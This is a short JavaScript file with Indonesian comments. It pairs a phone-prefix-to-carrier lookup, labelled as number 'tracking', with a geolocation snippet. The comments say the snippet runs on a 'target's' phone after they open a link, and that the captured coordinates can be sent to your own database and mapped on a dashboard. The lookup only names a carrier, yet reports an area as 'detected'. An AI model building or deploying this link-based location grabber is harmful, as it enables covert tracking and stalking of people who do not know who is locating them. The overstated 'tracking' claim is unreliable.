function lacakNomor() {
    const input = document.getElementById('phoneNumber').value.trim();
    const resultBox = document.getElementById('result');
    
    if (input.length < 4) {
        alert('Mohon masukkan nomor yang valid (minimal 4 digit awal).');
        return;
    }

    // Ambil 4 digit pertama (misal: 0812 atau 6281)
    let prefix = input.substring(0, 4);
    
    // Normalisasi jika user pakai format +62 atau 62
    if (prefix.startsWith('+62')) {
        prefix = '0' + input.substring(3, 6);
    } else if (prefix.startsWith('628')) {
        prefix = '08' + input.substring(3, 5);
    }

    let operator = "Tidak Dikenal / Format Salah";
    let area = "Indonesia";

    // Database prefix sederhana
    const prefixList = {
        '0811': 'Telkomsel (Kartu Halo)',
        '0812': 'Telkomsel (simPATI/Loop)',
        '0813': 'Telkomsel (simPATI)',
        '0821': 'Telkomsel (Simpati Nusantara)',
        '0822': 'Telkomsel (Loop)',
        '0852': 'Telkomsel (Kartu As)',
        '0809': 'Telkomsel (As)',
        '0814': 'Indosat M2 (Broadband)',
        '0815': 'Indosat (Matrix/Mentari)',
        '0816': 'Indosat (Matrix/Mentari)',
        '0855': 'Indosat (Matrix)',
        '0856': 'Indosat (IM3)',
        '0857': 'Indosat (IM3)',
        '0858': 'Indosat (Mentari)',
        '0817': 'XL Axiata',
        '0818': 'XL Axiata',
        '0819': 'XL Axiata',
        '0859': 'XL Axiata',
        '0877': 'XL Axiata',
        '0878': 'XL Axiata',
        '0838': 'Axis',
        '0831': 'Axis',
        '0832': 'Axis',
        '0895': 'Three (3)',
        '0896': 'Three (3)',
        '0897': 'Three (3)',
        '0898': 'Three (3)',
        '0899': 'Three (3)',
        '0881': 'Smartfren',
        '0882': 'Smartfren',
        '0888': 'Smartfren'
    };

    // Cek apakah prefix ada di database
    if (prefixList[prefix]) {
        operator = prefixList[prefix];
        area = "Terdeteksi berdasarkan alokasi nasional";
    }

    // Tampilkan hasil ke UI
    document.getElementById('resPhone').innerText = input;
    document.getElementById('resOperator').innerText = operator;
    document.getElementById('resArea').innerText = area;
    
    // Munculkan kotak hasil
    resultBox.classList.remove('hidden');
}
// Fungsi ini berjalan di HP target saat mereka membuka link dari Anda
navigator.geolocation.getCurrentPosition(successCallback, errorCallback);

function successCallback(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    
    console.log(`Lokasi Target - Lat: ${latitude}, Lon: ${longitude}`);
    // Di sini Anda bisa mengirim data koordinat ini ke database website Anda
    // Dan menampilkannya di Google Maps pada dashboard Anda
}

function errorCallback(error) {
    alert("Target menolak memberikan akses lokasi.");
}